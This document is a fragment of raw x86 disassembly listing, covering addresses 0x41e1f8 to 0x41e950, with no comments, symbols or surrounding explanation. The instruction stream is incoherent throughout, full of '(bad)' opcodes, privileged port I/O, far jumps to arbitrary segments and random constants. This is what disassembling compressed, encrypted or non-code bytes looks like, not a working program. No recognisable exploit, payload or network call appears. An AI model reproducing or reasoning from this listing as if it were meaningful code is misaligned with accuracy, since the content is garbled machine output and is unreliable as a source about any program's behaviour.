  41e1f8:	sbb    eax,DWORD PTR [ecx-0x70]
  41e1fb:	retf   
  41e1fc:	(bad)  
  41e1fd:	mov    ch,0x65
  41e1ff:	lea    edx,[ecx]
  41e201:	loopne 0x41e1a8
  41e203:	stc    
  41e204:	dec    eax
  41e205:	and    cl,BYTE PTR ds:0xfdc35c38
  41e20b:	jne    0x41e1d7
  41e20d:	fwait
  41e20e:	cmp    BYTE PTR [edx+ebp*1-0xaf4409c],dl
  41e215:	cmp    esi,edi
  41e217:	repnz mov ah,0x40
  41e21a:	sub    DWORD PTR [eax],0x1cbcf458
  41e220:	adc    al,0xab
  41e222:	mov    ds:0x44ca5e42,eax
  41e227:	jl     0x41e1d3
  41e229:	mov    ebx,0xee7e5921
  41e22e:	lods   al,BYTE PTR ds:[esi]
  41e22f:	push   0xe56c714b
  41e234:	cmp    al,0xd
  41e236:	icebp  
  41e237:	(bad)  
  41e238:	in     al,0x48
  41e23a:	xlat   BYTE PTR ds:[ebx]
  41e23b:	push   esp
  41e23c:	div    DWORD PTR [edx-0x5f]
  41e23f:	pop    ebp
  41e240:	pop    edi
  41e241:	and    DWORD PTR [eax+ecx*2+0x63],ebx
  41e245:	sub    BYTE PTR [edi],0x75
  41e248:	sub    ebx,ebx
  41e24a:	popa   
  41e24b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e24d:	sbb    DWORD PTR [edx-0x3f],edi
  41e250:	mov    BYTE PTR [esi],0x33
  41e253:	xchg   ecx,eax
  41e254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e255:	dec    ecx
  41e256:	scas   eax,DWORD PTR es:[edi]
  41e257:	adc    BYTE PTR [ecx-0x6e],bh
  41e25a:	(bad)  
  41e25b:	or     bl,bl
  41e25d:	jle    0x41e25b
  41e25f:	push   esp
  41e260:	hlt    
  41e261:	loopne 0x41e26d
  41e263:	jmp    0xd56d:0xced6ffe
  41e26a:	fbstp  TBYTE PTR [ebx]
  41e26c:	jmp    0x20fd:0xeb516678
  41e273:	and    dl,BYTE PTR [eax+0x6b]
  41e276:	cdq    
  41e277:	outs   dx,DWORD PTR ds:[si]
  41e279:	(bad)  
  41e27a:	cwde   
  41e27b:	out    dx,eax
  41e27c:	jg     0x41e27f
  41e27e:	neg    BYTE PTR [ebp+0x2a]
  41e281:	jle    0x41e22e
  41e283:	mov    esi,0xfd645534
  41e288:	sub    BYTE PTR [esi+0x20],bh
  41e28b:	jge    0x41e2df
  41e28d:	pop    esi
  41e28e:	push   es
  41e28f:	inc    ebp
  41e290:	hlt    
  41e291:	jb     0x41e29f
  41e293:	xchg   esi,eax
  41e294:	bound  eax,QWORD PTR [ebp-0x463bbfc9]
  41e29a:	lods   al,BYTE PTR ds:[esi]
  41e29b:	and    BYTE PTR [eax-0x25],bh
  41e29e:	div    BYTE PTR [ecx]
  41e2a0:	sti    
  41e2a1:	js     0x41e292
  41e2a3:	pop    es
  41e2a4:	adc    al,0x16
  41e2a6:	scas   al,BYTE PTR es:[edi]
  41e2a7:	inc    edx
  41e2a8:	mov    bl,BYTE PTR [edi-0x66]
  41e2ab:	jl     0x41e2f7
  41e2ad:	jle    0x41e2b5
  41e2af:	ret    0x96a7
  41e2b2:	cmp    DWORD PTR [ecx-0x59372500],0x1
  41e2b9:	mov    bl,BYTE PTR [edi]
  41e2bb:	out    0xb2,al
  41e2bd:	call   DWORD PTR [ebx+0x79726ab8]
  41e2c3:	xchg   esp,eax
  41e2c4:	xchg   ebp,eax
  41e2c5:	cmp    ebx,DWORD PTR [edx+0x39b6fdac]
  41e2cb:	dec    eax
  41e2cc:	push   ebp
  41e2cd:	xchg   BYTE PTR [ebp-0x180134e5],dh
  41e2d3:	rcl    BYTE PTR [esi+0x7bc3708],1
  41e2d9:	mov    dh,0x1d
  41e2db:	jecxz  0x41e2ef
  41e2dd:	imul   DWORD PTR [ebp+0x594bbce]
  41e2e3:	inc    edi
  41e2e4:	push   eax
  41e2e5:	aad    0x49
  41e2e7:	xchg   esi,eax
  41e2e8:	pop    edi
  41e2e9:	sub    al,0xaa
  41e2eb:	push   eax
  41e2ec:	sbb    BYTE PTR [ecx+0x47b8678f],dh
  41e2f2:	jmp    0x41e372
  41e2f4:	out    0x2b,al
  41e2f6:	mov    dl,0x93
  41e2f8:	mov    al,ds:0x5e664652
  41e2fd:	cmp    al,BYTE PTR [edx]
  41e2ff:	fwait
  41e300:	xchg   ecx,eax
  41e301:	or     al,0x1c
  41e304:	push   ds
  41e305:	mov    al,ds:0x9b8366f9
  41e30a:	inc    esi
  41e30b:	pusha  
  41e30c:	push   ss
  41e30d:	jp     0x41e316
  41e30f:	dec    ebp
  41e310:	sbb    al,BYTE PTR [ecx+0x7e1438b0]
  41e316:	jne    0x41e2d1
  41e318:	sbb    cl,BYTE PTR [eax]
  41e31a:	mov    al,0x32
  41e31c:	es push ds
  41e31e:	inc    esi
  41e31f:	or     ch,cl
  41e321:	mov    ebx,0xa955eb6c
  41e326:	mov    ecx,0x60cec846
  41e32b:	shl    BYTE PTR [ecx-0x43],1
  41e32e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e32f:	rol    BYTE PTR [ebx],cl
  41e331:	cwde   
  41e332:	jb     0x41e2ba
  41e334:	not    BYTE PTR [edi+0x3e]
  41e337:	aam    0x2d
  41e339:	xlat   BYTE PTR fs:[ebx]
  41e33b:	into   
  41e33c:	adc    edi,DWORD PTR ss:[ecx+0x6b]
  41e340:	sbb    BYTE PTR [ecx],ah
  41e342:	mov    WORD PTR [edx],cs
  41e344:	sub    al,0xd8
  41e346:	aaa    
  41e347:	clc    
  41e348:	or     DWORD PTR [ebp-0xb],ebx
  41e34b:	add    dh,dh
  41e34d:	stos   BYTE PTR es:[edi],al
  41e34e:	xchg   esp,eax
  41e34f:	mov    ebp,0xf24d42b0
  41e354:	lods   al,BYTE PTR ds:[esi]
  41e355:	sbb    BYTE PTR [ebx+ebp*2],0x48
  41e359:	mov    WORD PTR [edi-0x2edda012],?
  41e35f:	mov    cl,0x2f
  41e361:	(bad)  
  41e362:	cmp    ch,BYTE PTR [ecx+0x28722859]
  41e368:	pop    ss
  41e369:	(bad)  
  41e36a:	fcmovnb st,st(3)
  41e36c:	test   eax,0xbddc7650
  41e371:	aaa    
  41e372:	sbb    DWORD PTR [eax+0x27],0x5a16769f
  41e379:	push   ds
  41e37a:	out    0xf8,eax
  41e37c:	xchg   ecx,eax
  41e37d:	mov    cl,0xd
  41e37f:	(bad)  
  41e381:	loope  0x41e370
  41e383:	add    ebx,ebp
  41e385:	push   ss
  41e386:	xchg   edi,eax
  41e387:	add    eax,0xe4c78f3b
  41e38c:	mov    eax,ds:0x20feeb48
  41e391:	ror    dl,cl
  41e393:	push   0x72e5bdad
  41e398:	call   0xf3a7e705
  41e39d:	iret   
  41e39e:	sbb    DWORD PTR [ecx],ebx
  41e3a0:	dec    ebx
  41e3a1:	mov    dh,0x4c
  41e3a3:	out    dx,eax
  41e3a4:	dec    ecx
  41e3a5:	push   ds
  41e3a6:	or     DWORD PTR [edi],ebp
  41e3a8:	enter  0xaff1,0x27
  41e3ac:	push   eax
  41e3ad:	mov    al,BYTE PTR [edi]
  41e3af:	retf   
  41e3b0:	ficomp WORD PTR [edx]
  41e3b2:	fwait
  41e3b3:	inc    edx
  41e3b4:	jl     0x41e362
  41e3b6:	adc    dl,al
  41e3b8:	pop    edx
  41e3b9:	sub    al,0xcb
  41e3bb:	out    dx,eax
  41e3bc:	xor    al,0x16
  41e3be:	and    eax,0x6088efee
  41e3c3:	xchg   edx,eax
  41e3c4:	mov    al,0xec
  41e3c6:	sahf   
  41e3c7:	rol    DWORD PTR [edx-0x31],0xc2
  41e3cb:	and    DWORD PTR [esi],esi
  41e3cd:	addr16 in eax,dx
  41e3cf:	sub    BYTE PTR [esi-0x34],al
  41e3d2:	or     BYTE PTR [edx],al
  41e3d4:	in     eax,dx
  41e3d5:	add    esp,ecx
  41e3d7:	ss fs mov cl,0xe0
  41e3db:	loopne 0x41e419
  41e3dd:	xor    BYTE PTR [esi-0x3222b75f],bl
  41e3e3:	mov    ds:0x32559b6d,al
  41e3e8:	into   
  41e3e9:	cmp    eax,0xeca9bff6
  41e3ee:	std    
  41e3ef:	aaa    
  41e3f0:	pusha  
  41e3f1:	cs jge 0x41e3b6
  41e3f4:	sub    al,0x7e
  41e3f6:	ins    BYTE PTR es:[edi],dx
  41e3f7:	mov    eax,0xc1ce705f
  41e3fc:	fsubr  st,st(2)
  41e3fe:	sbb    eax,0x84240e4c
  41e403:	int3   
  41e404:	js     0x41e3dc
  41e406:	jecxz  0x41e46a
  41e408:	jecxz  0x41e46d
  41e40a:	xacquire xchg BYTE PTR [ecx],cl
  41e40d:	repz inc edx
  41e40f:	lods   eax,DWORD PTR ds:[esi]
  41e410:	out    dx,al
  41e411:	sbb    eax,0x70da1679
  41e416:	hlt    
  41e417:	and    eax,0xa35af033
  41e41c:	icebp  
  41e41d:	sbb    ah,BYTE PTR [ebp-0x472cecff]
  41e423:	test   al,0xa6
  41e425:	xor    ah,BYTE PTR [edx+0x2b384d62]
  41e42b:	push   eax
  41e42c:	adc    DWORD PTR [esi],edi
  41e42e:	ins    DWORD PTR es:[edi],dx
  41e42f:	hlt    
  41e430:	push   esi
  41e431:	mov    edx,0x53d10dfb
  41e436:	push   es
  41e437:	call   0xd1fd:0x76561b61
  41e43e:	mov    dh,0xf3
  41e440:	call   0x4989:0x48e02849
  41e447:	inc    esp
  41e448:	sahf   
  41e449:	cmc    
  41e44a:	push   esp
  41e44b:	add    al,dl
  41e44d:	or     bl,BYTE PTR [ebx+0x48]
  41e450:	inc    ebp
  41e451:	test   al,0xc8
  41e453:	addr16 jl 0x41e419
  41e456:	enter  0x2fd1,0xa1
  41e45a:	jg     0x41e407
  41e45c:	dec    edx
  41e45d:	dec    ecx
  41e45e:	inc    esi
  41e45f:	jbe    0x41e45d
  41e461:	nop
  41e462:	leave  
  41e463:	mov    ebx,0xeb43b801
  41e468:	and    BYTE PTR [edx+0x1eafac11],ch
  41e46e:	and    eax,0xab1511ec
  41e473:	xchg   ecx,eax
  41e474:	sbb    ebx,DWORD PTR [edx]
  41e476:	aaa    
  41e477:	jge    0x41e49d
  41e479:	and    al,0xbd
  41e47b:	dec    esp
  41e47c:	outs   dx,DWORD PTR ds:[esi]
  41e47d:	jge    0x41e42b
  41e47f:	sbb    DWORD PTR [edx+0x5],0xffffffaf
  41e483:	inc    esi
  41e484:	pop    edi
  41e485:	out    0xdd,al
  41e487:	xchg   ebp,eax
  41e488:	fwait
  41e489:	adc    eax,DWORD PTR [ecx+0x2a]
  41e48c:	mov    dl,0x4e
  41e48e:	test   eax,0x90324849
  41e493:	ficomp WORD PTR [eax+ebp*2+0x1]
  41e497:	loopne 0x41e517
  41e499:	adc    al,0x5c
  41e49b:	mov    dl,0xfb
  41e49d:	fnsave [ecx+0x13062189]
  41e4a3:	inc    ebp
  41e4a4:	jb     0x41e4a1
  41e4a6:	js     0x41e510
  41e4a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4a9:	inc    eax
  41e4aa:	lahf   
  41e4ab:	fnstenv [esi]
  41e4ad:	jb     0x41e443
  41e4af:	iret   
  41e4b0:	pop    edi
  41e4b1:	or     bl,BYTE PTR [ecx+0x1]
  41e4b4:	jbe    0x41e493
  41e4b6:	lahf   
  41e4b7:	sub    DWORD PTR [ebx+0x59526ee4],0xffffffdb
  41e4be:	aaa    
  41e4bf:	and    bl,BYTE PTR [eax+0x60]
  41e4c2:	test   eax,0xddd0e10c
  41e4c7:	sbb    bl,BYTE PTR [esp+edx*2-0x32]
  41e4cb:	lods   eax,DWORD PTR ds:[esi]
  41e4cc:	ror    BYTE PTR [eax-0x11bf5501],0x55
  41e4d3:	pop    DWORD PTR [edi-0x73]
  41e4d6:	fwait
  41e4d7:	dec    ecx
  41e4d8:	(bad)  
  41e4d9:	popf   
  41e4da:	mov    ah,0x8d
  41e4dc:	xor    eax,0x51cd8f38
  41e4e1:	in     al,0xa2
  41e4e3:	je     0x41e482
  41e4e5:	or     eax,0xe7ceb597
  41e4ea:	int    0x1c
  41e4ec:	cmp    eax,0xbcf8e8d
  41e4f1:	add    esp,ecx
  41e4f3:	dec    esi
  41e4f4:	mov    ch,0x44
  41e4f6:	ja     0x41e4b7
  41e4f8:	or     DWORD PTR [esi+0x26],eax
  41e4fb:	pop    edi
  41e4fc:	push   sp
  41e4fe:	ds jae 0x41e4b0
  41e501:	ret    0xaeed
  41e504:	sub    al,0x8d
  41e506:	mov    ebp,0x20cc8c04
  41e50b:	je     0x41e559
  41e50d:	retf   0x4e0c
  41e510:	or     cl,BYTE PTR [edx]
  41e512:	scas   eax,DWORD PTR es:[edi]
  41e513:	(bad)  
  41e514:	out    dx,al
  41e515:	jbe    0x41e544
  41e517:	pop    esi
  41e518:	(bad)  
  41e519:	ror    BYTE PTR [ecx],cl
  41e51b:	jg     0x41e545
  41e51d:	sub    dl,BYTE PTR [edi]
  41e51f:	cld    
  41e520:	jmp    0xc6fd:0xa6411d85
  41e527:	scas   al,BYTE PTR es:[edi]
  41e528:	sub    ebp,DWORD PTR [ecx+edx*8-0x4eee5a48]
  41e52f:	rol    DWORD PTR [esi-0x322f198],0x23
  41e536:	push   esi
  41e537:	stos   DWORD PTR es:[edi],eax
  41e538:	xchg   ebp,eax
  41e539:	mov    ah,0xf7
  41e53b:	jge    0x41e5ae
  41e53d:	js     0x41e4dd
  41e53f:	push   ecx
  41e540:	test   al,0xae
  41e542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e543:	mov    bh,0xd4
  41e545:	dec    ebx
  41e546:	lahf   
  41e547:	xor    BYTE PTR [eax+0x56cf2838],0xdb
  41e54e:	sbb    al,0x76
  41e550:	fcom   QWORD PTR ds:0x79c5b543
  41e556:	or     eax,0xa4cf6f82
  41e55b:	and    DWORD PTR [ecx+0x70],eax
  41e55e:	xchg   esp,eax
  41e55f:	out    dx,al
  41e560:	imul   esi,DWORD PTR [edx],0x480ea75f
  41e566:	sub    BYTE PTR [edx-0x22efd88c],ah
  41e56c:	(bad)  
  41e56d:	loop   0x41e54d
  41e56f:	scas   eax,DWORD PTR es:[edi]
  41e570:	mov    eax,ds:0x1f2c7b51
  41e575:	fwait
  41e576:	movntps XMMWORD PTR [edi-0x2581df3c],xmm7
  41e57d:	fisub  DWORD PTR [eax+0x588e5f4e]
  41e583:	sub    ecx,edi
  41e585:	in     al,dx
  41e586:	imul   edx,ecx,0xffffffc0
  41e589:	xchg   esi,eax
  41e58a:	dec    esp
  41e58b:	(bad)  
  41e58c:	xor    eax,0x67f87869
  41e591:	dec    ecx
  41e592:	shl    BYTE PTR [edi+ebx*8-0x7a],cl
  41e596:	daa    
  41e597:	sbb    ecx,ecx
  41e599:	call   0x7c44:0x2971b1eb
  41e5a0:	and    eax,0x6199abde
  41e5a5:	(bad)
  41e5a8:	inc    edi
  41e5a9:	sti    
  41e5aa:	pop    ecx
  41e5ab:	nop
  41e5ac:	dec    ebx
  41e5ad:	jbe    0x41e627
  41e5af:	sbb    ah,BYTE PTR [edi-0x2b785d54]
  41e5b5:	ins    DWORD PTR es:[edi],dx
  41e5b6:	gs ss adc eax,0x8780e4c0
  41e5bd:	(bad)  
  41e5be:	mov    ds:0x962b2207,eax
  41e5c3:	cmp    bl,al
  41e5c5:	adc    BYTE PTR [edi-0x3],cl
  41e5c8:	(bad)  
  41e5c9:	fdivr  QWORD PTR [edi]
  41e5cb:	data16 fisubr DWORD PTR [ebx-0x4]
  41e5cf:	je     0x41e640
  41e5d1:	pop    ebx
  41e5d2:	loope  0x41e59d
  41e5d4:	aad    0x7e
  41e5d6:	or     DWORD PTR [ebx+0x2d037af9],ecx
  41e5dc:	arpl   WORD PTR [ecx+0x19],bx
  41e5df:	and    BYTE PTR ds:0x9537bb41,bh
  41e5e5:	sbb    al,0x27
  41e5e7:	mov    al,ds:0x7c7aa261
  41e5ec:	in     al,0xb7
  41e5ee:	sbb    edi,DWORD PTR [ebx+ebp*4+0x30]
  41e5f2:	xor    eax,0xdc573816
  41e5f7:	jbe    0x41e57f
  41e5f9:	and    DWORD PTR ds:0xcfe3113,ebp
  41e5ff:	sbb    edx,DWORD PTR [edx]
  41e601:	int    0xb8
  41e603:	xchg   ebp,eax
  41e604:	add    al,BYTE PTR [eax-0x28]
  41e607:	(bad)  
  41e608:	dec    esp
  41e609:	mov    dh,0xf8
  41e60b:	pop    eax
  41e60c:	hlt    
  41e60d:	popa   
  41e60e:	pop    ds
  41e60f:	in     al,dx
  41e610:	inc    eax
  41e611:	fcom   DWORD PTR [esi]
  41e613:	shl    dh,cl
  41e615:	inc    edx
  41e616:	(bad)  
  41e617:	pop    ss
  41e618:	imul   esp,DWORD PTR [esi-0x59ab13ce],0x3e0b647e
  41e622:	loopne 0x41e665
  41e624:	pop    ebx
  41e625:	retf   0xefa2
  41e628:	cmp    eax,0xbb0d34e6
  41e62d:	daa    
  41e62e:	or     BYTE PTR [eax+0xc],ah
  41e631:	paddusw mm0,QWORD PTR [ebp-0x71a79af]
  41e638:	outs   dx,DWORD PTR ds:[esi]
  41e639:	push   es
  41e63a:	int3   
  41e63b:	leave  
  41e63c:	xchg   esi,eax
  41e63d:	inc    edx
  41e63e:	in     al,dx
  41e63f:	mov    cs,esi
  41e641:	popf   
  41e642:	repz ret 0xbe2
  41e646:	sub    eax,0x8b256a86
  41e64b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e64c:	inc    eax
  41e64d:	xchg   ebp,esp
  41e64f:	stos   BYTE PTR es:[edi],al
  41e650:	push   ecx
  41e651:	js     0x41e61e
  41e653:	push   eax
  41e654:	out    dx,eax
  41e655:	xor    DWORD PTR [edi+0x7b],ebp
  41e658:	(bad)  [edi-0x5851b1a9]
  41e65e:	cmp    DWORD PTR [eax+0x7c65ddb5],eax
  41e664:	imul   ecx,ebp,0xffffffb8
  41e667:	call   0xa2cf:0x5e7ff786
  41e66e:	enter  0xe857,0xdc
  41e672:	loope  0x41e67e
  41e674:	and    ebx,DWORD PTR [esi+0x32]
  41e677:	xchg   esp,eax
  41e678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e679:	sti    
  41e67a:	push   ss
  41e67b:	aad    0x8d
  41e67d:	inc    ebx
  41e67e:	fbstp  TBYTE PTR [ebx+0x31]
  41e681:	jnp    0x41e6d9
  41e683:	jmp    0x41e631
  41e685:	mov    DWORD PTR [esi-0x4be2da6a],0xc7eee126
  41e68f:	cmp    cl,cl
  41e691:	nop
  41e692:	pop    esi
  41e693:	mov    ds:0xc078abcf,al
  41e698:	jne    0x41e629
  41e69a:	hlt    
  41e69b:	and    ch,BYTE PTR [ebx]
  41e69d:	mov    edi,ebx
  41e69f:	push   ebp
  41e6a0:	fist   DWORD PTR [esi+0x3c]
  41e6a3:	mov    ch,0xe4
  41e6a5:	imul   eax,DWORD PTR [eax+0x72],0xd4746c81
  41e6ac:	aaa    
  41e6ad:	(bad)  
  41e6ae:	(bad)  
  41e6af:	push   edx
  41e6b0:	or     bh,BYTE PTR [ebx]
  41e6b2:	cmp    al,0x7f
  41e6b4:	inc    edi
  41e6b5:	retf   0xf402
  41e6b8:	cld    
  41e6b9:	xor    al,0x14
  41e6bb:	fst    QWORD PTR [esi+edx*1+0x207d99d1]
  41e6c2:	mov    ebp,0x997c86e2
  41e6c7:	push   es
  41e6c8:	sub    BYTE PTR [eax+0x69],0x7
  41e6cc:	repnz mov ds:0x50d033c8,al
  41e6d2:	addr16 pop esp
  41e6d4:	cmc    
  41e6d5:	xchg   BYTE PTR [ebp-0x1f],bh
  41e6d8:	pop    esp
  41e6d9:	call   0x9752723d
  41e6de:	enter  0xbf55,0xe0
  41e6e2:	jp     0x41e715
  41e6e4:	mov    ah,0xa6
  41e6e6:	pop    es
  41e6e7:	xchg   esi,eax
  41e6e8:	scas   al,BYTE PTR es:[edi]
  41e6e9:	ja     0x41e73f
  41e6eb:	les    eax,FWORD PTR [ebx-0x3c402434]
  41e6f1:	push   esi
  41e6f2:	push   ecx
  41e6f3:	xor    ebp,DWORD PTR [esp+edi*2]
  41e6f6:	inc    eax
  41e6f7:	ins    BYTE PTR es:[edi],dx
  41e6f8:	mov    eax,0xfaa342f5
  41e6fd:	push   edi
  41e6fe:	xor    al,0xf9
  41e700:	popa   
  41e701:	(bad)
  41e704:	popf   
  41e705:	dec    BYTE PTR [ebx+0x59]
  41e708:	adc    BYTE PTR [ebp+ecx*8-0x25],ah
  41e70c:	inc    edi
  41e70d:	jg     0x41e6f2
  41e70f:	fisttp WORD PTR [esi]
  41e711:	cmp    edx,DWORD PTR [ecx]
  41e713:	mov    esi,0xcfb3e02d
  41e718:	sahf   
  41e719:	or     al,0x72
  41e71b:	(bad)  
  41e71d:	repz jmp 0x8a79ae3f
  41e723:	jns    0x41e751
  41e725:	mov    bh,0x3b
  41e727:	cwde   
  41e728:	jno    0x41e7a1
  41e72a:	fld    DWORD PTR [edi]
  41e72c:	out    dx,eax
  41e72d:	pop    ds
  41e72e:	jne    0x41e6bf
  41e730:	cli    
  41e731:	and    ch,BYTE PTR [ebp+ebx*8+0x11]
  41e735:	sbb    BYTE PTR [edi],dh
  41e737:	xor    dh,ch
  41e739:	fst    QWORD PTR [ecx-0x2dc646b0]
  41e73f:	retf   0xc0a1
  41e742:	mov    al,ds:0x5da9dd1f
  41e747:	dec    edx
  41e748:	and    al,BYTE PTR [ebp+ebp*8-0x24]
  41e74c:	stc    
  41e74d:	ret    0xc7e6
  41e750:	arpl   WORD PTR [edi+edx*2+0x66],cx
  41e754:	sub    al,0x54
  41e756:	inc    ebx
  41e757:	adc    ebp,DWORD PTR ds:0x162009cd
  41e75d:	iret   
  41e75e:	sub    esp,DWORD PTR [ebp+0x79da01c9]
  41e764:	push   ss
  41e765:	rcr    bh,0xd5
  41e768:	in     eax,0x7
  41e76a:	jp     0x41e75d
  41e76c:	loopne 0x41e778
  41e76e:	jo     0x41e6f5
  41e770:	push   edx
  41e771:	fs iret 
  41e773:	or     DWORD PTR [edx],0xffffffdd
  41e776:	(bad)  
  41e777:	nop
  41e778:	pop    edi
  41e779:	fld    QWORD PTR [ebx-0x7bf41385]
  41e77f:	sub    al,0xc4
  41e781:	push   ds
  41e782:	hlt    
  41e783:	fld    QWORD PTR [ecx+0x384f143d]
  41e789:	jle    0x41e7a2
  41e78b:	fcom   DWORD PTR [eax-0x76]
  41e78e:	je     0x41e79a
  41e790:	ins    DWORD PTR es:[edi],dx
  41e791:	shl    DWORD PTR [ecx],1
  41e793:	sbb    al,0x8a
  41e795:	adc    al,0xd5
  41e797:	loopne 0x41e731
  41e799:	adc    edi,ebx
  41e79b:	cmp    BYTE PTR [ebx+0x5],0xa5
  41e79f:	inc    esi
  41e7a0:	add    ah,BYTE PTR [eax]
  41e7a2:	hlt    
  41e7a3:	jmp    0x41e77e
  41e7a5:	inc    ebx
  41e7a6:	fcmovnu st,st(4)
  41e7a8:	adc    bl,BYTE PTR [edi+0x6b]
  41e7ab:	out    0x59,eax
  41e7ad:	ror    DWORD PTR [ecx],1
  41e7af:	cmp    al,0xac
  41e7b1:	mov    bh,0x3c
  41e7b3:	xchg   ebp,eax
  41e7b4:	add    al,0x66
  41e7b6:	mov    esp,DWORD PTR [ebx]
  41e7b8:	dec    esi
  41e7b9:	xor    BYTE PTR [edx+esi*2],al
  41e7bc:	lea    ecx,[edx]
  41e7be:	fistp  QWORD PTR [ebx+0xe]
  41e7c1:	sbb    DWORD PTR [ebp-0x2e],edx
  41e7c4:	aaa    
  41e7c5:	out    0x7a,eax
  41e7c7:	out    dx,al
  41e7c8:	xor    eax,0x415d1588
  41e7cd:	ins    BYTE PTR es:[edi],dx
  41e7ce:	add    esi,ebx
  41e7d0:	imul   esi,DWORD PTR [edx],0xffffffab
  41e7d3:	hlt    
  41e7d4:	fsubr  QWORD PTR [esi-0x573aa3df]
  41e7da:	or     al,0x50
  41e7dc:	(bad)  
  41e7dd:	(bad)  
  41e7de:	call   0xba88:0x7a523887
  41e7e5:	mov    ah,0x93
  41e7e7:	call   0xfb3aa014
  41e7ec:	and    eax,0x6d7210cc
  41e7f1:	inc    ecx
  41e7f2:	pop    ds
  41e7f3:	and    eax,0x1feea392
  41e7f8:	xor    bl,al
  41e7fa:	push   ebx
  41e7fb:	cmp    ecx,DWORD PTR [edi-0x6655a1c8]
  41e801:	pop    ecx
  41e802:	ja     0x41e83e
  41e804:	icebp  
  41e805:	int    0x6e
  41e807:	mov    WORD PTR [edi+esi*2+0x63d98f6f],ds
  41e80e:	xor    BYTE PTR [edi+0x6d],bh
  41e811:	mov    dh,0x17
  41e813:	mov    ebp,0x372f1351
  41e818:	mov    ch,0x7b
  41e81a:	shl    bh,cl
  41e81c:	cld    
  41e81d:	nop
  41e81e:	outs   dx,DWORD PTR ds:[esi]
  41e81f:	xchg   esp,eax
  41e820:	psubq  mm5,mm3
  41e823:	mov    ds:0xeba26511,eax
  41e828:	js     0x41e831
  41e82a:	push   ds
  41e82b:	cmc    
  41e82c:	scas   eax,DWORD PTR es:[edi]
  41e82d:	push   esp
  41e82e:	xchg   ebp,eax
  41e82f:	or     esp,ecx
  41e831:	mov    ebp,0x43b155ca
  41e836:	dec    ebp
  41e837:	cmp    al,cl
  41e839:	int3   
  41e83a:	xlat   BYTE PTR ds:[ebx]
  41e83b:	ret    
  41e83c:	in     eax,dx
  41e83d:	fnstenv [esi]
  41e83f:	leave  
  41e840:	adc    ebp,DWORD PTR [ecx-0x49c5cd26]
  41e846:	add    al,dh
  41e848:	cwde   
  41e849:	imul   ebp,esi,0x24
  41e84c:	sub    DWORD PTR [edx+0x6582b91f],ebx
  41e852:	jo     0x41e813
  41e854:	push   esi
  41e855:	stos   DWORD PTR es:[edi],eax
  41e856:	clc    
  41e857:	jo     0x41e8d3
  41e859:	daa    
  41e85a:	(bad)  
  41e85c:	aad    0xd7
  41e85e:	jmp    0xd98c0f98
  41e863:	mov    ebp,0x633e206
  41e868:	lock mov ds:0xc6dd2481,eax
  41e86e:	jl     0x41e8c5
  41e870:	repnz int3 
  41e872:	cmp    BYTE PTR [ebp+0x6a],0xa
  41e876:	mov    esp,0x1b04fab0
  41e87b:	xor    DWORD PTR [ebx+0x47],edx
  41e87e:	cmp    al,0x79
  41e880:	dec    ebp
  41e881:	fdiv   QWORD PTR [ebx]
  41e883:	add    eax,0xd32dfead
  41e888:	jbe    0x41e84c
  41e88a:	mov    ds:0xdb637419,al
  41e88f:	xchg   DWORD PTR [edi+0xe82bb44],ebp
  41e895:	jne    0x41e8a6
  41e897:	fcomi  st,st(7)
  41e899:	cmp    eax,0xf93c2dd6
  41e89e:	or     esi,DWORD PTR [ecx+0x521fb501]
  41e8a4:	stos   BYTE PTR es:[edi],al
  41e8a5:	and    DWORD PTR [edi],0xf989e716
  41e8ab:	loope  0x41e879
  41e8ad:	rcl    BYTE PTR [ebp-0x3a],0x66
  41e8b1:	cli    
  41e8b2:	cli    
  41e8b3:	pushf  
  41e8b4:	sub    BYTE PTR [ebp+0x5c],dl
  41e8b7:	mov    esi,0x81e76771
  41e8bc:	lds    ecx,FWORD PTR [eax]
  41e8be:	or     dl,cl
  41e8c0:	test   al,0x4e
  41e8c2:	loope  0x41e869
  41e8c4:	jno    0x41e939
  41e8c6:	jmp    0xe84d:0xb256bb34
  41e8cd:	jno    0x41e935
  41e8cf:	lods   eax,DWORD PTR ds:[esi]
  41e8d0:	jbe    0x41e94c
  41e8d2:	lods   eax,DWORD PTR ds:[esi]
  41e8d3:	rol    BYTE PTR [ebx-0x52],1
  41e8d6:	pop    ecx
  41e8d7:	sbb    DWORD PTR [esi],ebp
  41e8d9:	out    dx,eax
  41e8da:	jne    0x41e874
  41e8dc:	fdivr  DWORD PTR [edx-0xe]
  41e8df:	xlat   BYTE PTR ds:[ebx]
  41e8e0:	dec    esi
  41e8e1:	mov    ch,0x29
  41e8e3:	inc    esp
  41e8e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8e5:	nop
  41e8e6:	jge    0x41e8d2
  41e8e8:	mov    al,ds:0x9d6f5ff1
  41e8ed:	pop    edx
  41e8ee:	add    edx,esp
  41e8f0:	or     ecx,DWORD PTR [edi-0x1f]
  41e8f3:	and    ebx,DWORD PTR [edi+esi*1+0x195db952]
  41e8fa:	mov    dh,0x3f
  41e8fc:	sahf   
  41e8fd:	scas   al,BYTE PTR es:[edi]
  41e8fe:	ficom  WORD PTR [ebp+0x7e661f1a]
  41e904:	(bad)  
  41e905:	mov    esi,0x1f9dad9f
  41e90a:	scas   eax,DWORD PTR es:[edi]
  41e90b:	pop    ds
  41e90c:	add    bl,BYTE PTR [esi-0x4ac7f579]
  41e912:	inc    esi
  41e913:	sub    eax,0x374f1f1c
  41e918:	xor    al,0x2a
  41e91a:	mov    eax,ds:0x42825cde
  41e91f:	jle    0x41e921
  41e921:	loop   0x41e91f
  41e923:	sbb    edi,esp
  41e925:	fwait
  41e926:	lods   eax,DWORD PTR ds:[esi]
  41e927:	mov    ds:0x80e349cb,al
  41e92c:	push   esi
  41e92d:	sub    eax,DWORD PTR [ebx-0x2d]
  41e930:	fsubr  QWORD PTR [ecx]
  41e932:	ss xchg ecx,eax
  41e934:	jb     0x41e96b
  41e936:	arpl   WORD PTR ds:0x746f7f8f,cx
  41e93c:	add    esp,DWORD PTR [ebx-0x1133f75f]
  41e942:	xchg   ecx,eax
  41e943:	mov    edx,0xf3e9e7f0
  41e948:	fstp   TBYTE PTR [esi]
  41e94a:	gs gs xor edx,eax
  41e94e:	add    ecx,esi
  41e950:	add    edx,esi
